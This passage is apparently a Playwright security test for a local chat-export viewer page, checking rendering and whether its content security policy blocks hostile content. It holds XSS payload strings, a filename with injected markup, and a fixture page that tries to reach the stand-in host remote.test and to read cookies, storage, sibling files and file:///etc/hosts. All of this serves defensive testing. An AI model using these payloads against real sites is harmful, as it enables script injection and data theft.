// The viewer page over file:// in Chromium, built from the synthetic fixture. SHOT_DIR=<dir> also saves screenshots.
const { chromium } = require(process.env.PW);
const fs = require('fs'), os = require('os'), path = require('path'), vm = require('vm');
const { buildHtml } = require('./make-viewer.js');
const { loadPopup, REPO } = require('../helpers');
const { VIEWER_CHECK_BASE64 } = require('../../takeout-viewer.js');
const JSZip = require('../../jszip.min.js');
const fixture = require('../fixtures/conversation.json');

const HIT = 'window.__hit=1';
const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlEQVR42mNkYPhfz0AEYBxVSF+FAAhKDveksOjmAAAAAElFTkSuQmCC';
const PAYLOADS = [
  `<script>${HIT}</script>`,
  `<img src=x onerror="${HIT}">`,
  `<a id="js" href="javascript:${HIT}">click</a>`,
  `<svg onload="${HIT}"></svg>`,
  `<iframe src="javascript:parent.__hit=1"></iframe>`,
  '<style>@import url(https://remote.test/x.css);</style>',
  '<img src="https://remote.test/x.png">',
];
// Things only the whole pipeline can reach.
const PIPELINE_PAYLOADS = [
  ...PAYLOADS,
  `<a title="$x$ <img src=x onerror=${HIT}>">math in an attribute</a>`,
  '![remote](https://remote.test/y.png)',
  '<img src="file:///etc/hosts">',
  `<img name="getElementById" src="${PNG}">`,
  '<div style="background:url(https://remote.test/z.png);width:9px;height:9px"></div>',
  `<video src="https://remote.test/v.mp4" autoplay></video><audio src="https://remote.test/a.mp3" autoplay></audio>`,
  // A quote in an attribute name once put math's double quotes inside a live attribute value.
  `<div x'y="$x$" <q=" tabindex=1 autofocus onfocus=${HIT} ">hello</div>`,
  `<div x"y='$x$' <q=" tabindex=1 autofocus onfocus=${HIT} ">hello</div>`,
  `<div x'y="$x$ <img src=x onerror=${HIT}>">hello</div>`,
  '<frameset>',
];

const RICH = `## Spending by team

The third quarter closed **under plan**, with one *notable* exception. See \`travel_total\` in the sheet.

### What changed

- Travel rose 12% over plan
- Software licences fell after the renewal
  - Two seats were dropped
- Hiring moved to the fourth quarter

| Team | Plan | Actual | Change |
|---|---:|---:|---:|
| Design | 40 | 38 | -5% |
| Field | 75 | 84 | +12% |
| Platform | 120 | 117 | -2.5% |

> Figures are rounded to the nearest thousand.

The variance is $\\Delta = \\frac{A - P}{P}$, so the total at a cost of $5 stays simple:

$$\\sum_{i=1}^{n} \\frac{A_i - P_i}{P_i} = 0.045$$

\`\`\`python
def variance(actual, plan):
    # share of plan, $ signs stay literal here
    return (actual - plan) / plan
\`\`\`

1. Confirm the travel figures
2. Send the summary to [finance](https://example.com/finance)

---

That covers the quarter.`;

function clone(o) { return JSON.parse(JSON.stringify(o)); }

function richChat() {
  const c = clone(fixture);
  c.name = 'Quarterly budget review';
  c.model = 'claude-opus-4-8-20260101';
  c.updated_at = '2026-11-05T12:00:00Z';
  const text = c.chat_messages.find(m => m.uuid === 'm01').content[0];
  text.text = 'Can you turn this into a one-page summary?\n\nKeep the tables, and show how the variance is worked out.';
  const m = c.chat_messages.find(x => x.uuid === 'm02');
  const cited = m.content.find(b => b.type === 'text');
  cited.text = "Here's the summary, with spending by team and what to check next.";
  cited.citations = [{ end_index: 18, url: 'https://example.com/a', title: 'Budget guidance' }, { end_index: 66, url: 'https://example.org/b', title: 'Team spending report' }];
  m.content.push({ type: 'text', text: RICH });
  c.chat_messages.find(x => x.uuid === 'm06').content.push({ type: 'text', text: 'The wording is fixed.' });
  const shot = c.chat_messages.find(x => x.uuid === 'm08').content.find(b => b.tool_use_id === 't12');
  shot.content.push({ type: 'image', source: { type: 'base64', media_type: 'image/png', data: PNG.split(',')[1] } });
  return c;
}

function plainChat(id, name, count, updated) {
  const messages = [];
  for (let i = 0; i < count; i++) {
    messages.push({
      uuid: `${id}-${i}`, parent_message_uuid: i ? `${id}-${i - 1}` : null, sender: i % 2 ? 'assistant' : 'human',
      created_at: `2026-02-01T10:${String(i % 60).padStart(2, '0')}:00Z`, content: [{ type: 'text', text: `${name} message ${i}` }],
      attachments: [], files: [], files_v2: [],
    });
  }
  return { uuid: id, name, model: 'claude-x', created_at: '2026-02-01T10:00:00Z', updated_at: updated, settings: {}, current_leaf_message_uuid: `${id}-${count - 1}`, chat_messages: messages };
}

// Assistant messages with these texts, each after a short user message. items: a string or a content block.
function turnsChat(id, name, items, updated) {
  const c = plainChat(id, name, items.length * 2, updated);
  items.forEach((item, i) => {
    c.chat_messages[i * 2].content[0].text = `question ${i}`;
    c.chat_messages[i * 2 + 1].content[0] = typeof item === 'string' ? { type: 'text', text: item } : { type: 'text', ...item };
  });
  return c;
}

// Each payload in a message of its own, so that one can't hide another.
function hostileChat() {
  const c = turnsChat('hostile', `<img src=x onerror="${HIT}">`, PIPELINE_PAYLOADS, '2026-01-01T00:00:00Z');
  c.chat_messages[0].content[0].text = PIPELINE_PAYLOADS.join('\n');
  return c;
}

const TAG_WORDS = {
  textarea: 'Use a <textarea> for input, and keep going.\n\nSecond paragraph stays.\n\n## This heading stays',
  script: 'The <script> tag runs code.\n\nThis second paragraph is important.',
  comment: 'Start <!-- not closed\n\nThis other paragraph is important.',
  rawCode: 'Inside <code> 1 < 2 <notatag and more.\n\nFinal paragraph.',
};

// Citations or math against a URL. href: what the link must point to, link: its text, text: what shows.
const LINK_CASES = [
  { item: { text: 'See https://example.com/docs. More.', citations: [{ end_index: 29, url: 'https://example.com/c1', title: 'C1' }] }, href: 'https://example.com/docs', link: 'https://example.com/docs', text: 'See https://example.com/docs.1 More.', cites: 1 },
  { item: { text: 'See https://example.com/docs now', citations: [{ end_index: 28, url: 'https://example.com/c2', title: 'C2' }] }, href: 'https://example.com/docs', link: 'https://example.com/docs', text: 'See https://example.com/docs1 now', cites: 1 },
  { item: { text: 'See www.example.com/docs now', citations: [{ end_index: 24, url: 'https://example.com/c3', title: 'C3' }] }, href: 'http://www.example.com/docs', link: 'www.example.com/docs', text: 'See www.example.com/docs1 now', cites: 1 },
  { item: { text: 'See <https://example.com/docs> now', citations: [{ end_index: 29, url: 'https://example.com/c4', title: 'C4' }] }, href: 'https://example.com/docs', link: 'https://example.com/docs', text: 'See https://example.com/docs1 now', cites: 1 },
  { item: 'Go https://a.test/?a=$x$&b=$y$ now', href: 'https://a.test/?a=$x$&b=$y$', link: 'https://a.test/?a=$x$&b=$y$', text: 'Go https://a.test/?a=$x$&b=$y$ now', cites: 0 },
  { item: '[go](https://a.test/$x$/$y$) now', href: 'https://a.test/$x$/$y$', link: 'go', text: 'go now', cites: 0 },
  { item: '[mail](mailto:me$x$@a.test) now', href: 'mailto:me$x$@a.test', link: 'mail', text: 'mail now', cites: 0 },
];

function textChat() {
  return turnsChat('text', 'Text chat', [
    ...Object.values(TAG_WORDS),
    'Literal XMATHX0XEND and \u27E6T0M0\u27E7 with $y^2$ beside them.',
    { text: 'Area $x^2$ was **Done.** and more.', citations: [{ end_index: 25, url: 'https://example.com/a?x="1"&y=<2>', title: '"><b>Title</b>' }, { end_index: 2, url: 'https://example.com/z', title: 'Zed' }] },
    { text: 'Before.\n\n```\n$x$ in a fence\n```\n\n    $z$ indented\n\nInline `$q$` too, and [$w$](https://example.com/w "$t$").', citations: [{ end_index: 16, url: 'https://example.com/f', title: 'In a fence' }] },
    'See <https://example.com/auto> here.',
    ...LINK_CASES.map(c => c.item),
  ], '2026-01-02T00:00:00Z');
}

// A chat that makes each file with create_file, reported the way the exporter's replay reports them.
// spec: { name, versions: [text], gone: true }. text '' means the export holds it as a binary.
function filesChat(id, title, specs, updated) {
  const messages = [], artifacts = {}, artifactIndex = {};
  let n = 0, parent = null;
  const push = (sender, content) => {
    const uuid = `${id}-${n}`;
    messages.push({ uuid, parent_message_uuid: parent, sender, created_at: `2026-03-01T10:${String(n % 60).padStart(2, '0')}:00Z`, content, attachments: [], files: [], files_v2: [] });
    parent = uuid;
    n++;
    return uuid;
  };
  for (const spec of specs) {
    const path = `/mnt/user-data/outputs/${spec.name}`;
    if (spec.gone) {
      push('human', [{ type: 'text', text: `show ${spec.name}` }]);
      push('assistant', [{ type: 'text', text: 'Here it is.' }, { type: 'tool_use', id: `t${n}`, name: 'present_files', input: { filepaths: [path] } }]);
      continue;
    }
    const dot = spec.name.lastIndexOf('.');
    const fns = spec.versions.length > 1 ? spec.versions.map((_, i) => `${spec.name.slice(0, dot)}_v${i + 1}${spec.name.slice(dot)}`) : [spec.name];
    const made = [];
    spec.versions.forEach((text, i) => {
      artifacts[fns[i]] = text;
      push('human', [{ type: 'text', text: `make ${spec.name}` }]);
      made.push(push('assistant', [{ type: 'text', text: `Made ${spec.name}.` }, { type: 'tool_use', id: `t${n}`, name: 'create_file', input: { path, file_text: text || 'bytes' } }]));
    });
    artifactIndex[path] = { path, filename: spec.name, versions: fns, messages: made };
  }
  return {
    conversation: { uuid: id, name: title, model: 'claude-x', created_at: '2026-03-01T10:00:00Z', updated_at: updated, settings: {}, current_leaf_message_uuid: parent, chat_messages: messages },
    ctx: { artifacts, artifactIndex },
  };
}

// Reports through the console, which the test reads from outside the frame.
const REPORT = "const report = (n, v) => console.log('ATTACK ' + n + ' ' + v);\ndocument.addEventListener('securitypolicyviolation', e => console.log('VIOLATION ' + e.violatedDirective + ' ' + e.blockedURI));";

const ATTACKS = {
  fetch: "fetch('https://remote.test/fetch').then(() => 'REACHED')",
  xhr: "new Promise(done => { const x = new XMLHttpRequest(); x.onload = () => done('REACHED'); x.onerror = () => done('blocked'); x.open('GET', 'https://remote.test/xhr'); x.send(); })",
  beacon: "navigator.sendBeacon('https://remote.test/beacon', 'x')",
  websocket: "new Promise(done => { const w = new WebSocket('wss://remote.test/ws'); w.onopen = () => done('REACHED'); w.onerror = () => done('blocked'); })",
  'remote-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'https://remote.test/img.png'; })",
  'file-fetch': "fetch('file:///etc/hosts').then(() => 'REACHED')",
  'file-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'file:///System/Library/Desktop%20Pictures/.thumbnails/x.png'; })",
  'dynamic-import': "import('https://remote.test/mod.js').then(() => 'REACHED')",
  'parent-document': "parent.document.title",
  'parent-storage': "parent.localStorage.length",
  'parent-location': "parent.location.href",
  'top-location': "(top.location = 'https://remote.test/top', 'REACHED')",
  'window-open': "window.open('https://remote.test/popup') ? 'REACHED' : 'blocked'",
  'link-popup': "(document.getElementById('pop').click(), 'clicked')",
  storage: "localStorage.length",
  cookie: "document.cookie",
};

const HOSTILE_HTML = `<!doctype html><html><head><title>hostile</title>
<link rel="stylesheet" href="https://remote.test/s.css">
<style>@import url(https://remote.test/i.css); @font-face { font-family: f; src: url(https://remote.test/f.woff); } body { font-family: f; background: url(https://remote.test/bg.png); }</style>
</head><body><h1>hostile</h1>
<base href="https://remote.test/base/"><img src="relative.png">
<img src="https://remote.test/tag.png"><video src="https://remote.test/v.mp4" autoplay></video>
<iframe src="https://remote.test/frame"></iframe><object data="https://remote.test/obj"></object>
<iframe srcdoc="<script>console.log('NESTED ran');fetch('https://remote.test/nested')<\/script>"></iframe>
<a id="pop" href="https://remote.test/link" target="_blank">go</a>
<script>${REPORT}
const attempt = async (name, run) => {
  report(name, 'ran');
  try { report(name, 'gave ' + await run()); } catch (e) { report(name, 'threw ' + e.name); }
};
(async () => {
  console.log('ATTACK origin ' + self.origin);
${Object.entries(ATTACKS).map(([k, v]) => `  await attempt(${JSON.stringify(k)}, () => ${v});`).join('\n')}
  report('finished', 'yes');
})();
</script></body></html>`;

// What each attack must come to. sendBeacon says true once it has queued, and the policy stops it after that.
const ATTACK_ENDS = {
  fetch: 'threw TypeError', xhr: 'gave blocked', beacon: 'gave true', websocket: 'gave blocked', 'remote-img': 'gave blocked',
  'file-fetch': 'threw TypeError', 'file-img': 'gave blocked', 'dynamic-import': 'threw TypeError',
  'parent-document': 'threw SecurityError', 'parent-storage': 'threw SecurityError', 'parent-location': 'threw SecurityError',
  'top-location': 'threw SecurityError', 'window-open': 'gave blocked', 'link-popup': 'gave clicked', storage: 'threw SecurityError', cookie: 'threw SecurityError',
};

// Each leaves the document it runs in, so each gets a file of its own. ran is logged before the attempt.
const navArtifact = (name, attempt, head = '') => ({
  name,
  versions: [`<!doctype html><html><head>${head}</head><body>${name}<script>console.log('NAV ran ${name}');setTimeout(() => { ${attempt} }, 30);<\/script></body></html>`],
});

const ESCAPE_HTML = "<!doctype html><script>console.log('ESCAPED');fetch('https://remote.test/escaped')<\/script>";
const MINIMAL_PDF = '%PDF-1.1\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n';
const report = n => `<!doctype html><html><head><title>Report</title><style>h1{color:#b03a2e}</style></head><body><h1>Q3 budget summary</h1><p id="ver">report version ${n}</p><script>console.log('PREVIEW report ${n}')<\/script></body></html>`;
const BAD_NAME = `x"><img src=x onerror=${HIT}>.py`;
const NOTES_MD = `## Notes\n\nThe **variance** is $x^2$.\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\n<img src=x onerror="${HIT}">\n\n![remote](https://remote.test/md.png)\n`;

function panelChat() {
  return filesChat('files', 'Generated files', [
    { name: 'report.html', versions: [report(1), report(2), report(3)] },
    { name: 'single.html', versions: [report('only')] },
    { name: 'notes.md', versions: [NOTES_MD] },
    { name: 'hostile.html', versions: [HOSTILE_HTML] },
    { name: 'uses-sibling.html', versions: ['<!doctype html><link href="./sibling.css" rel="stylesheet"><body><p id="s">before</p><script type="module" src=sibling.js></script></body>'] },
    { name: 'sibling.js', versions: ["console.log('SIBLING ran $&');\ndocument.getElementById('s').textContent = 'changed by sibling';\nconst closing = '</script>';\nconsole.log('SIBLING after ' + closing);\n"] },
    { name: 'defer.html', versions: ['<!doctype html><html><head><script defer src="defer.js"></script></head><body><p id="d">before</p></body></html>'] },
    { name: 'defer.js', versions: ["console.log('DEFER ran ' + !!document.getElementById('d'));\ndocument.getElementById('d').textContent = 'changed by defer';\n"] },
    { name: 'eval.html', versions: ["<!doctype html><body><script>try { console.log('EVAL gave ' + new Function('return 7')()); } catch (e) { console.log('EVAL threw ' + e.name); }<\/script></body>"] },
    { name: 'sibling.css', versions: ['p { color: rgb(1, 2, 3); }'] },
    { name: 'notes.txt', versions: ['SECRET-NOTES\n'] },
    { name: 'other.html', versions: ['<!doctype html><p>SECRET-OTHER</p>'] },
    { name: 'thief.html', versions: [`<!doctype html><link rel=stylesheet href=notes.txt><script type=text/plain src=other.html><\/script><link rel=stylesheet href=sibling.css><script>
const said = [...document.querySelectorAll('style, script')].map(n => n.textContent).join(' ');
console.log('THIEF ran');
console.log('THIEF css ' + said.includes('rgb(1, 2, 3)'));
console.log('THIEF notes ' + said.includes('SECRET-' + 'NOTES'));
console.log('THIEF other ' + said.includes('SECRET-' + 'OTHER'));
<\/script>`] },
    { name: 'remote-lib.html', versions: ["<!doctype html><script src=\"https://remote.test/lib.js\"></script><script>console.log('REMOTE page ran')</script><p>uses a library</p>"] },
    { name: 'drawing.svg', versions: ['<?xml version="1.0"?><!DOCTYPE svg PUBLIC "x" "y"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" onload="console.log(\'SVG ran\')"><circle r="20" cx="20" cy="20" fill="#c96442"/></svg>'] },
    { name: 'tool.py', versions: [`print("<b>hi</b>")\n# <img src=x onerror=${HIT}>\n`] },
    { name: 'Chart.jsx', versions: ['export default () => <div/>;\n'] },
    { name: 'flow.mmd', versions: ['graph TD;\n  A-->B;\n'] },
    { name: 'photo.png', versions: [''] },
    { name: 'paper.pdf', versions: [''] },
    { name: 'fake.pdf', versions: [''] },
    { name: 'bundle.zip', versions: [''] },
    { name: 'opaque.html', versions: [''] },
    { name: 'gone.png', gone: true },
    { name: BAD_NAME, versions: ['pass\n'] },
    navArtifact('nav-https.html', "location.href = 'https://remote.test/nav';"),
    navArtifact('nav-relative.html', "location.href = 'artefacts/escape.html';"),
    navArtifact('nav-file.html', "location.href = new URL('artefacts/escape.html', document.baseURI).href;"),
    navArtifact('nav-data.html', "location.href = 'data:text/html,<script>console.log(%22ESCAPED%22)<\\/script>';"),
    navArtifact('nav-blob.html', "location.href = URL.createObjectURL(new Blob(['<script>console.log(\"ESCAPED\")<\\/script>'], { type: 'text/html' }));"),
    navArtifact('nav-refresh.html', '', '<meta http-equiv="refresh" content="0;url=https://remote.test/refresh">'),
    navArtifact('nav-form.html', "const f = document.createElement('form'); f.action = 'https://remote.test/form'; f.method = 'post'; document.body.append(f); f.submit();"),
    navArtifact('nav-top-link.html', "const a = document.createElement('a'); a.href = 'https://remote.test/top-link'; a.target = '_top'; document.body.append(a); a.click();"),
  ], '2026-06-01T00:00:00Z');
}

const UPLOAD_HTML = `<h1>Uploaded</h1><img src=x onerror="${HIT}"><script>${HIT}</script>`;

// A message with uploads of each shape, a pasted attachment, and a project with a file and a document.
function uploadsChat() {
  const c = plainChat('uploads', 'Uploads chat', 2, '2025-01-01T00:00:00Z');
  const m = c.chat_messages[0];
  m.content[0].text = 'Here are my files.';
  m.files_v2 = [
    { file_uuid: 'f-photo', file_name: 'photo.png', file_kind: 'image', success: true },
    { file_uuid: 'f-html', file_name: 'page.html', success: true },
    { file_uuid: 'f-pdf', file_name: 'paper.pdf', success: true },
    { file_uuid: 'f-odt', file_name: 'minutes.odt', success: true },
    { file_uuid: 'f-lost', file_name: 'lost.csv', success: true },
  ];
  m.attachments = [{ file_name: 'pasted.txt', extracted_content: 'line one\nline two <b>literal</b>' }];
  return {
    conversation: c,
    ctx: {
      folder: '',
      uploads: {
        'f-photo': { path: 'uploads/p01_photo.png', text: null },
        'f-html': { path: 'uploads/p01_page.html', text: UPLOAD_HTML },
        'f-pdf': { path: 'uploads/p01_paper.pdf', text: null },
        'f-odt': { path: 'uploads/p01_minutes.odt', text: null },
      },
      project: { name: 'Budget project', fileDir: 'project/files', fileNames: ['spec.pdf', 'data.zip'], docs: [{ name: 'Brief', text: 'Be <i>kind</i>.\nSecond line.' }] },
    },
  };
}

// Exports two project chats as bulkExportZip does, with real populateConversationFolder, writeViewer and JSZip.
async function unzipMegaZip(out) {
  const PDF_ID = 'f0f0f0f0', PHOTO_ID = 'e1e1e1e1';
  const blob = (bytes, type) => Object.assign(Buffer.from(bytes), { type, size: bytes.length, text: async () => bytes.toString() });
  const fetchStub = async url => {
    if (url.startsWith('chrome-extension://test/')) {
      const text = fs.readFileSync(path.join(REPO, url.replace('chrome-extension://test/', '')), 'utf8');
      return { ok: true, status: 200, text: async () => text };
    }
    if (/\/projects\/P$/.test(url)) return { ok: true, status: 200, json: async () => ({ name: 'Shared Project', docs_count: 0, files_count: 1 }) };
    if (/\/projects\/P\/docs$/.test(url)) return { ok: true, status: 200, json: async () => [] };
    if (/\/projects\/P\/files$/.test(url)) return { ok: true, status: 200, json: async () => [{ file_uuid: PDF_ID, file_name: 'Paper.pdf' }] };
    if (url.endsWith(`/files/${PDF_ID}/contents`)) return { ok: true, status: 200, blob: async () => blob(Buffer.from(MINIMAL_PDF, 'latin1'), 'application/pdf') };
    if (url.endsWith(`/files/${PHOTO_ID}/contents`)) return { ok: true, status: 200, blob: async () => blob(Buffer.from(PNG.split(',')[1], 'base64'), 'image/png') };
    return { ok: false, status: 404 };
  };
  const popup = loadPopup({ fetch: fetchStub });
  const zip = new JSZip();
  popup.sandbox.__shared = { root: zip, byUuid: new Map(), usedDirs: new Set() };
  const chats = [];
  for (const [id, name, files] of [
    ['one', 'Chat with a photo', [{ success: true, file_name: 'photo.png', file_uuid: PHOTO_ID, file_kind: 'image' }]],
    ['two', 'Second project chat', []],
  ]) {
    const data = Object.assign(plainChat(id, name, 2, '2026-04-01T00:00:00Z'), { project_uuid: 'P' });
    data.chat_messages[0].files_v2 = files;
    await popup.fn('ensureProjectName')(data, 'org');
    const folderName = `[${popup.fn('safeFilename')(data.project.name)}-project]_${popup.fn('safeFilename')(name)}`;
    popup.sandbox.__folder = zip.folder(folderName);
    popup.sandbox.__data = data;
    popup.sandbox.__name = folderName;
    const result = await vm.runInContext("populateConversationFolder(__folder, __data, null, 'org', __shared, __name)", popup.sandbox);
    chats.push(result.viewerChat);
  }
  popup.sandbox.__zip = zip;
  popup.sandbox.__chats = chats;
  if (!(await vm.runInContext('writeViewer(__zip, __chats)', popup.sandbox))) throw new Error('writeViewer failed');
  const unzip = await JSZip.loadAsync(await zip.generateAsync({ type: 'nodebuffer' }));
  for (const [name, entry] of Object.entries(unzip.files)) {
    if (entry.dir) continue;
    fs.mkdirSync(path.dirname(path.join(out, name)), { recursive: true });
    fs.writeFileSync(path.join(out, name), await entry.async('nodebuffer'));
  }
}

(async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'takeout-viewer-'));
  const file = path.join(dir, 'viewer.html');
  fs.writeFileSync(file, buildHtml([richChat(), plainChat('long', 'Long chat', 300, '2026-03-01T00:00:00Z'), plainChat('short', 'Short chat', 2, '2026-02-01T00:00:00Z'), textChat(), hostileChat()], '2026-11-05T12:00:00Z'));
  fs.writeFileSync(path.join(dir, 'viewer-check.gif'), Buffer.from(VIEWER_CHECK_BASE64, 'base64'));
  const url = 'file://' + file;
  const browser = await chromium.launch({ executablePath: process.env.CHROME_EXE });
  let failed = 0;
  const check = (n, ok, x = '') => { if (!ok) failed++; console.log(`${ok ? 'PASS' : 'FAIL'}  ${n} ${ok ? '' : x}`); };
  const open = async (options = {}, target = url) => {
    const context = await browser.newContext({ viewport: { width: 1360, height: 900 }, ...options });
    const page = await context.newPage();
    const seen = { requests: [], errors: [], logs: [], files: [] };
    await page.route('**/*', r => {
      const u = r.request().url();
      if (u.startsWith('file:') || u.startsWith('data:')) { seen.files.push(u); return r.continue(); }
      seen.requests.push(u);
      return r.abort();
    });
    page.on('console', m => { seen.logs.push(m.text()); if (m.type() === 'error') seen.errors.push(m.text()); });
    page.on('pageerror', e => seen.errors.push(e.message));
    await page.goto(target);
    await page.waitForSelector('.msg');
    return { page, seen, context };
  };
  const clean = (name, seen) => {
    check(`${name}: zero network requests`, seen.requests.length === 0, seen.requests.join());
    check(`${name}: zero console errors`, seen.errors.length === 0, seen.errors.join(' | '));
  };

  try {
    const { page, seen } = await open();
    const chats = await page.$$eval('.item', els => els.map(e => e.textContent));
    check('sidebar shows the brand', (await page.textContent('.brand')) === 'Claude Takeout');
    check('sidebar lists every chat', chats.length === 5 && chats.includes('Short chat'), chats.join());
    check('footer counts the chats', (await page.textContent('#archive')) === 'Archive · 5 chats · read-only');
    check('newest chat opens first', (await page.textContent('#title')) === 'Quarterly budget review');
    check('open chat is marked in the sidebar', (await page.textContent('.item[aria-current="true"]')) === 'Quarterly budget review');
    check('top bar shows the model', (await page.textContent('#meta')).startsWith('Opus 4.8 · '));
    check('page has a CSP', await page.$eval('meta[http-equiv="Content-Security-Policy"]', m => /default-src 'none'.*img-src file: data: blob:; media-src data: blob:/.test(m.content)));

    const box = await page.$eval('.bubble', b => { const r = b.getBoundingClientRect(), c = document.getElementById('chat').getBoundingClientRect(); return { right: c.right - r.right, left: r.left - c.left }; });
    check('user bubble sits on the right', box.right < box.left && box.right < 40, JSON.stringify(box));
    check('user text is literal', (await page.textContent('.bubble')).includes('one-page summary?\n\nKeep'));
    check('assistant text is serif', /Charter/.test(await page.$eval('.prose', p => getComputedStyle(p).fontFamily)));
    check('chips render', (await page.textContent('.chip')).normalize('NFC').includes('Gödel.md'.normalize('NFC')));
    check('timestamps render', await page.$$eval('time.when', t => t.length > 0 && t.every(x => x.dateTime)));
    check('dark tokens exist', await page.evaluate(() => [...document.styleSheets].some(s => [...s.cssRules].some(r => r.media && /prefers-color-scheme: dark/.test(r.media.mediaText)))));

    check('table renders', (await page.$$('.prose .table table td')).length === 12);
    check('headings render', (await page.$$('.prose h2, .prose h3')).length === 2);
    check('math renders', (await page.$$('.prose .katex')).length === 2 && (await page.$$('.prose .katex-display')).length === 1);
    check('money stays text', (await page.textContent('.assistant')).includes('a cost of $5 stays simple'));
    check('dollars in code stay literal', (await page.textContent('.code code')).includes('$ signs stay literal'));
    check('code has a language label', (await page.textContent('.code-head span')) === 'python');
    check('citations are numbered links', (await page.$$eval('sup.cite a', a => a.map(x => x.textContent).join())) === '1,2');
    check('sources are listed', (await page.textContent('.sources')).includes('Team spending report'));
    await page.click('.copy');
    await page.waitForFunction(() => document.querySelector('.copy span').textContent === 'Copied');
    check('Copy reports success', true);

    check('thinking and tools start collapsed', await page.$$eval('details.line', d => d.length > 8 && d.every(x => !x.open)));
    check('thinking line is labelled', (await page.textContent('details.thinking summary')).includes('Thought process'));
    await page.click('details.thinking summary');
    check('thinking expands on click', await page.$eval('details.thinking', d => d.open && d.textContent.includes('Then write it.') && d.querySelector('.line-text').offsetHeight > 0));
    await page.click('details.tool summary');
    check('tool expands to input and result', await page.$eval('details.tool', d => d.open && d.textContent.includes('Input') && d.textContent.includes('report.html') && d.textContent.includes('Result')));
    await page.focus('details.tool:nth-of-type(3) summary');
    await page.keyboard.press('Enter');
    check('tool expands from the keyboard', await page.$eval('details.tool:nth-of-type(3)', d => d.open));
    const failing = await page.$$eval('details.tool', d => d.filter(x => x.querySelector('.fail')).map(x => x.textContent));
    check('failed tool calls say so', failing.length === 2, failing.join());
    check('tool images show outside the fold', await page.$$eval('.tool-images img', i => i.length === 1 && !i[0].closest('details') && i[0].naturalWidth > 0));
    check('off-branch messages stay out', !(await page.textContent('#chat')).includes('abandoned'));

    // Review Focus 5: a later render cancels what is still pending.
    await page.evaluate(() => { const by = t => [...document.querySelectorAll('.item')].find(i => i.textContent === t); by('Long chat').click(); by('Short chat').click(); });
    await page.waitForTimeout(600);
    const ids = await page.$$eval('.msg', m => m.map(x => x.dataset.id));
    check('switching chats cancels pending batches', ids.join() === 'short-0,short-1', ids.join());
    check('rapid switch leaves the title right', (await page.textContent('#title')) === 'Short chat');
    await page.click('.item:has-text("Long chat")');
    await page.waitForFunction(() => document.querySelectorAll('.msg').length === 300, null, { timeout: 5000 });
    check('a long chat finishes rendering', true);
    check('messages use content-visibility', await page.$eval('.msg', m => getComputedStyle(m).contentVisibility === 'auto'));
    clean('main flow', seen);

    // Branch arrows and the hash.
    const br = await open();
    const branchState = () => br.page.evaluate(() => ({
      ids: [...document.querySelectorAll('.msg')].map(m => m.dataset.id), hash: location.hash,
      label: document.querySelector('.msg[data-id="m06"] .branch .pos, .msg[data-id="x01"] .branch .pos')?.textContent,
    }));
    const first = await br.page.$eval('.msg[data-id="m06"] .branch', b => ({
      pos: b.querySelector('.pos').textContent, prevOff: b.querySelector('button[data-dir="-1"]').disabled, nextOff: b.querySelector('button[data-dir="1"]').disabled,
      labels: [...b.querySelectorAll('button')].map(x => x.getAttribute('aria-label')).join(),
    })).catch(() => null);
    check('branch arrows show 1 / 2 on m06', first && first.pos === '1 / 2', JSON.stringify(first));
    check('first branch disables Previous only', first && first.prevOff && !first.nextOff, JSON.stringify(first));
    check('arrow buttons have accessible labels', first && /Previous/.test(first.labels) && /Next/.test(first.labels), JSON.stringify(first));
    check('messages with one version have no arrows', (await br.page.$$('.msg:not([data-id="m06"]) .branch')).length === 0);
    check('the first chat load writes the hash', /chat=/.test(await br.page.evaluate(() => location.hash)));
    await br.page.click('.msg[data-id="m06"] .branch button[data-dir="1"]', { timeout: 1500 }).catch(() => {});
    await br.page.waitForSelector('.msg[data-id="x01"]', { timeout: 2000 }).catch(() => {});
    const second = await branchState();
    check('Next shows the other reply', second.ids.includes('x01') && !second.ids.includes('m06'), JSON.stringify(second));
    check('second branch reads 2 / 2', second.label === '2 / 2', JSON.stringify(second));
    check('the hash names the leaf', /leaf=x01/.test(second.hash), second.hash);
    check('Next is disabled on the last branch', await br.page.$eval('.msg[data-id="x01"] .branch button[data-dir="1"]', b => b.disabled).catch(() => false));
    await br.page.reload();
    await br.page.waitForSelector('.msg');
    check('reload keeps the branch', (await branchState()).ids.includes('x01'));
    await br.page.goBack();
    await br.page.waitForSelector('.msg[data-id="m06"]', { timeout: 2000 }).catch(() => {});
    const back = await branchState();
    check('Back returns to the first branch', back.ids.includes('m06') && !back.ids.includes('x01'), JSON.stringify(back));
    await br.page.waitForTimeout(200);
    check('hash changes do not render twice', (await br.page.$$('.msg[data-id="m06"]')).length === 1);
    clean('branch flow', br.seen);

    const unknown = await open({}, url + '#chat=no-such-chat&leaf=nope');
    check('an unknown chat opens the newest chat', (await unknown.page.textContent('#title')) === 'Quarterly budget review');
    const unknownHash = await unknown.page.evaluate(() => location.hash);
    check('an unknown chat is replaced in the hash', /chat=/.test(unknownHash) && !/no-such/.test(unknownHash), unknownHash);
    const keep = await open({}, url + '#chat=short&file=a.html&version=2');
    check('a hash opens its chat', (await keep.page.textContent('#title')) === 'Short chat');
    const keepHash = await keep.page.evaluate(() => location.hash);
    check('an unknown file leaves the hash', !/file=|version=/.test(keepHash), keepHash);
    const badLeaf = await open({}, url + '#chat=short&leaf=nope');
    check('an unknown leaf still shows the chat', (await badLeaf.page.$$('.msg')).length === 2);
    await keep.page.click('.item:has-text("Quarterly")');
    const clickHash = await keep.page.evaluate(() => location.hash);
    check('sidebar clicks go through the hash', /chat=/.test(clickHash) && !/short/.test(clickHash), clickHash);

    // Emphasis parsing is quadratic on runs like this; the block shows as plain text instead.
    const slowFile = path.join(dir, 'slow.html');
    fs.writeFileSync(slowFile, buildHtml([turnsChat('slow', 'Slow chat', ['*a '.repeat(34000), 'Next **bold** one'], '2026-05-01T00:00:00Z')], '2026-11-05T12:00:00Z'));
    const started = Date.now();
    const slow = await open({}, 'file://' + slowFile);
